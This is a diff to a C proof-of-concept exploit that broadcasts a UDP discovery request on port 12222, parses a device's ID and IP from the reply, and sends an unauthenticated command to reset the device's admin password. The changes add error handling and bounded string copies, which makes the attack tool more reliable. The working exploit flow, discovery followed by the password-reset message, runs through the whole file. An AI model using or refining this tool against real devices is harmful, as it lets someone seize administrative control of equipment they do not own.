@@ -6,8 +6,9 @@
 
 #define PORT 12222
 #define BUFFER_SIZE 1024
+#define TIMEOUT_SEC 3
 
-void send_udp_message(const char *message, const char *ip, char *response) {
+void send_udp_message(const char *message, const char *ip, char *response, size_t response_size) {
     int sock;
     struct sockaddr_in server_addr;
     socklen_t addr_len = sizeof(server_addr);
@@ -19,12 +20,20 @@ void send_udp_message(const char *message, const char *ip, char *response) {
     }
 
     int broadcast_enable = 1;
-    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast_enable, sizeof(broadcast_enable));
-
+    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast_enable, sizeof(broadcast_enable)) < 0) {
+        perror("setsockopt failed");
+        close(sock);
+        exit(EXIT_FAILURE);
+    }
+    
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(PORT);
-    server_addr.sin_addr.s_addr = inet_addr(ip);
+    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
+        perror("Invalid address/ Address not supported");
+        close(sock);
+        exit(EXIT_FAILURE);
+    }
 
     printf("[*] Sending UDP message to %s:%d\n", ip, PORT);
     printf("[*] Message:\n\n%s\n", message);
@@ -36,14 +45,24 @@ void send_udp_message(const char *message, const char *ip, char *response) {
     }
 
     // receive response
-    struct timeval timeout = {3, 0}; // x-second timeout
-    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
+    struct timeval timeout = {TIMEOUT_SEC, 0};
+    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) {
+        perror("setsockopt failed");
+        close(sock);
+        exit(EXIT_FAILURE);
+    }
+
     ssize_t recv_len = recvfrom(sock, buffer, BUFFER_SIZE - 1, 0, (struct sockaddr *)&server_addr, &addr_len);
     if (recv_len < 0) {
-        printf("[*] No response received.\n");
+        if (errno == EAGAIN || errno == EWOULDBLOCK) {
+            printf("[*] No response received.\n");
+        } else {
+            perror("recvfrom failed");
+        }
     } else {
         buffer[recv_len] = '\0'; // null-terminate response
-        strcpy(response, buffer);
+        strncpy(response, buffer, response_size - 1);
+        response[response_size - 1] = '\0';
     }
 
     close(sock);
@@ -71,15 +90,16 @@ int main() {
     
     dev_ip[strcspn(dev_ip, "\n")] = 0;
     if (strlen(dev_ip) == 0) {
-        strcpy(dev_ip, "255.255.255.255");
+        strncpy(dev_ip, "255.255.255.255", sizeof(dev_ip) - 1);
+        dev_ip[sizeof(dev_ip) - 1] = '\0';
     }
 
     printf("[*] Searching for device...\n");
 
     // send discovery request
-    send_udp_message("    SEARCH * HDS/1.0\r\n    CSeq:1\r\n    Client-ID:bogus\r\n\r\n", dev_ip, response);
+    send_udp_message("    SEARCH * HDS/1.0\r\n    CSeq:1\r\n    Client-ID:bogus\r\n\r\n", dev_ip, response, sizeof(response));
 
-    // parese device id and ip
+    // parse device id and ip
     char *dev_id_ptr = strstr(response, "Device-ID=");
     char *dev_ip_ptr = strstr(response, "IP=");
 
@@ -88,8 +108,8 @@ int main() {
         return 1;
     }
 
-    sscanf(dev_id_ptr, "Device-ID=%s", dev_id);
-    sscanf(dev_ip_ptr, "IP=%s", dev_ip);
+    sscanf(dev_id_ptr, "Device-ID=%63s", dev_id);
+    sscanf(dev_ip_ptr, "IP=%31s", dev_ip);
 
     printf("[*] Found device at %s (ID: %s)\n", dev_ip, dev_id);
     printf("[*] Resetting admin password...\n");
@@ -101,7 +121,7 @@ int main() {
              dev_id);
 
     // sned reset
-    send_udp_message(reset_cmd, dev_ip, response);
+    send_udp_message(reset_cmd, dev_ip, response, sizeof(response));
 
     if (strlen(response) == 0) {
         printf("[*] No response received, device may not be vulnerable.\n");
